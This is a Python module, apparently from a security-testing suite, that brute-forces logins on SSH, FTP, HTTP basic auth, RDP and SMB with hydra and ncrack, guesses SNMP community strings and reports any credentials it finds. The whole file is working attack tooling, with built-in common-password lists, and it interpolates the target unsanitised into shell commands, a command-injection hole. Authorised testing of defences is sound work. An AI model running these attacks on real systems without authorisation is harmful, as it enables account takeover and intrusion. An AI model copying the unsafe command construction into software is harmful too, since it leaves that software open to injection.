"""
NetProbe Security Suite - Brute Force Module
Tools: hydra (SSH/FTP/HTTP/RDP/SMB), snmpwalk (SNMP)
"""
import os
import re
import shutil
from utils.raw_exec import raw_exec

MODULE_NAMES = {
    "ssh_brute":  "SSH Brute Force",
    "ftp_brute":  "FTP Brute Force",
    "http_auth":  "HTTP Basic Auth Brute",
    "rdp_brute":  "RDP Brute Force",
    "snmp_brute": "SNMP Community String",
    "smb_brute":  "SMB Auth Brute",
}

SECLISTS = "/opt/seclists"
FALLBACK_USERS = "admin\nroot\nuser\ntest\nguest\nadministrator\noracle\nsa\npostgres\nmanager\noperator"
FALLBACK_PASS  = "admin\npassword\n123456\nroot\ntest\n12345\nqwerty\nletmein\nchangeme\n1234\nadmin123\npass\nwelcome"

def _ensure_wordlists():
    ulist = os.path.join(SECLISTS, "Usernames/top-usernames-shortlist.txt")
    plist = os.path.join(SECLISTS, "Passwords/Common-Credentials/top-20-common-SSH-passwords.txt")
    if not os.path.exists(ulist):
        ulist = "/tmp/np_users.txt"
        with open(ulist, "w") as f: f.write(FALLBACK_USERS)
    if not os.path.exists(plist):
        plist = "/tmp/np_pass.txt"
        with open(plist, "w") as f: f.write(FALLBACK_PASS)
    return ulist, plist

async def run_brute_force_module(module_id, target, intensity, duration, log_fn):
    name = MODULE_NAMES.get(module_id, module_id)
    await log_fn("MODULE", f"▶ {name}", module_id)

    if module_id == "snmp_brute":
        return await _snmp_brute(target, log_fn)

    if module_id == "rdp_brute":
        return await _rdp_brute(target, intensity, log_fn)

    if not shutil.which("hydra"):
        await log_fn("WARN", "hydra no instalado: sudo apt install hydra", module_id)
        return {}, "ERROR", None

    ulist, plist = _ensure_wordlists()
    threads = {1:1, 2:2, 3:4, 4:8, 5:16}.get(intensity, 4)
    svc_map = {
        "ssh_brute": "ssh",
        "ftp_brute": "ftp",
        "http_auth": f"http-get://{target}/",
        "smb_brute": "smb",
    }
    svc = svc_map.get(module_id, "ssh")

    if module_id == "http_auth":
        cmd = f"hydra -L {ulist} -P {plist} -t {threads} -f {target} http-get /"
    else:
        cmd = f"hydra -L {ulist} -P {plist} -t {threads} -f {svc}://{target}"

    out, err, rc = await raw_exec(cmd, log_fn, module_id, timeout=180)
    full = out + err

    creds   = re.findall(r"login:\s*(\S+)\s+password:\s*(\S+)", full)
    blocked = bool(re.search(r"blocked|too many|lockout|rate.limit|Connection refused", full, re.I))

    if creds:
        await log_fn("WARN", f"CREDENCIAL VÁLIDA ENCONTRADA: {creds[0][0]}:{creds[0][1]}", module_id)
        return {"credentials_found": [{"user": c[0], "pass": c[1]} for c in creds]}, "PASSED", 0
    if blocked:
        return {"blocked": True}, "BLOCKED", 100
    if "0 of 1 target" in full or "successfully completed" in full:
        return {"no_credentials": True}, "BLOCKED", 100
    return {"no_credentials_found": True}, "DETECTED", 60


async def _rdp_brute(target, intensity, log_fn):
    """RDP brute — uses ncrack or hydra+rdp, fallback to port check."""
    # Try ncrack first
    if shutil.which("ncrack"):
        ulist, plist = _ensure_wordlists()
        cmd = f"ncrack -U {ulist} -P {plist} rdp://{target}"
        out, err, rc = await raw_exec(cmd, log_fn, "rdp_brute", timeout=120)
        creds = re.findall(r"Discovered credentials.*?(\S+)\s+(\S+)", out + err)
        if creds:
            return {"credentials_found": [{"user":c[0],"pass":c[1]} for c in creds]}, "PASSED", 0
        return {}, "BLOCKED", 100

    # Try hydra with rdp (needs freerdp)
    if shutil.which("hydra"):
        ulist, plist = _ensure_wordlists()
        threads = {1:1, 2:2, 3:4, 4:4, 5:4}.get(intensity, 2)  # RDP doesn't support many threads
        cmd = f"hydra -L {ulist} -P {plist} -t {threads} -f rdp://{target}"
        out, err, rc = await raw_exec(cmd, log_fn, "rdp_brute", timeout=120)
        full = out + err
        creds = re.findall(r"login:\s*(\S+)\s+password:\s*(\S+)", full)
        if creds:
            return {"credentials_found": [{"user":c[0],"pass":c[1]} for c in creds]}, "PASSED", 0
        if "Error" in full and "library" in full.lower():
            await log_fn("WARN", "hydra rdp requiere freerdp: sudo apt install freerdp2-x11", "rdp_brute")

    # Fallback: check if RDP port is open + enumerate with nmap
    cmd_nmap = f"nmap -p 3389 -sV --script rdp-enum-encryption {target}"
    out, err, rc = await raw_exec(cmd_nmap, log_fn, "rdp_brute", timeout=60)
    if "open" in out:
        await log_fn("WARN", "Puerto RDP 3389 abierto y accesible", "rdp_brute")
        return {"port_3389_open": True, "note": "Instala ncrack o freerdp para brute force completo"}, "DETECTED", 60
    return {"port_3389_open": False}, "BLOCKED", 100


async def _snmp_brute(target, log_fn):
    """SNMP community string brute force using snmpget/snmpwalk."""
    communities = ["public", "private", "community", "admin", "manager",
                   "monitor", "cisco", "default", "snmp", "secret", "write"]

    # Check if snmpget is available
    if not shutil.which("snmpget") and not shutil.which("snmpwalk"):
        await log_fn("WARN", "snmp-tools no instalado: sudo apt install snmp", "snmp_brute")
        return {}, "ERROR", None

    tool = "snmpget" if shutil.which("snmpget") else "snmpwalk"
    found = []

    for comm in communities:
        if tool == "snmpget":
            cmd = f"snmpget -v2c -c {comm} -t 2 -r 0 {target} SNMPv2-MIB::sysDescr.0"
        else:
            cmd = f"snmpwalk -v2c -c {comm} -t 2 {target} system"

        out, err, rc = await raw_exec(cmd, log_fn, "snmp_brute", timeout=6)
        if rc == 0 and ("STRING" in out or "enterprises" in out or "SNMPv2" in out):
            found.append(comm)
            await log_fn("WARN", f"SNMP community válida: '{comm}'", "snmp_brute")

    if found:
        # Get full system info with valid community
        cmd_info = f"snmpwalk -v2c -c {found[0]} {target} system"
        await raw_exec(cmd_info, log_fn, "snmp_brute", timeout=15)
        return {"communities_found": found}, "PASSED", 0

    return {"communities_tested": len(communities), "found": 0}, "BLOCKED", 100
